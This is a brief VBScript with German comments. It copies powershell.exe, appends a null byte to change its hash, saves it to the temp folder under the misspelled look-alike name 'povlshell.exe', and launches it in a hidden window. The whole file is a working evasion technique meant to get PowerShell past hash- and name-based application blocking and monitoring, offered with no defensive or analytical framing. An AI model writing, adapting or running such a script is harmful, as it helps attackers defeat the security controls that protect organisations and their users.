Dim Filename
Dim Bytearray
Dim bin
Dim Arraylength
Dim newFilename
Dim dir
Dim name
Dim retval
Dim objShell
Dim i

Filename = "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"

Set bin = CreateObject("ADODB.Stream")
bin.Type = 1
bin.Open
bin.LoadFromFile Filename

' Bytearray als Variant speichern
Bytearray = bin.Read
bin.Close

' Prüfen, ob Bytearray tatsächlich ein Array ist
If IsArray(Bytearray) Then
    ' Sicherstellen, dass es als echtes Array behandelt wird
    Dim tempArray()
    ReDim tempArray(UBound(Bytearray))

    ' Bytes kopieren
    For i = 0 To UBound(Bytearray)
        tempArray(i) = Bytearray(i)
    Next

    ' Null-Byte anhängen
    Arraylength = UBound(tempArray)
    ReDim Preserve tempArray(Arraylength + 1)
    tempArray(Arraylength + 1) = 0
Else
    WScript.Echo "Fehler: Bytearray konnte nicht erstellt werden."
    WScript.Quit
End If

' Stream erneut öffnen und schreiben
bin.Open
bin.Type = 1
bin.Write tempArray  ' Hier war vorher der Fehler
bin.Position = 0  ' Sicherstellen, dass der Stream am Anfang ist

' Zielverzeichnis für neue Datei setzen
Set objShell = CreateObject("WScript.Shell")
dir = objShell.ExpandEnvironmentStrings("%TEMP%")
name = "povlshell.exe"
newFilename = dir & "\" & name

' Datei speichern
bin.SaveToFile newFilename, 2
bin.Close
Set bin = Nothing

' Datei ausführen
retval = objShell.Run(newFilename, 0, False)
Set objShell = Nothing
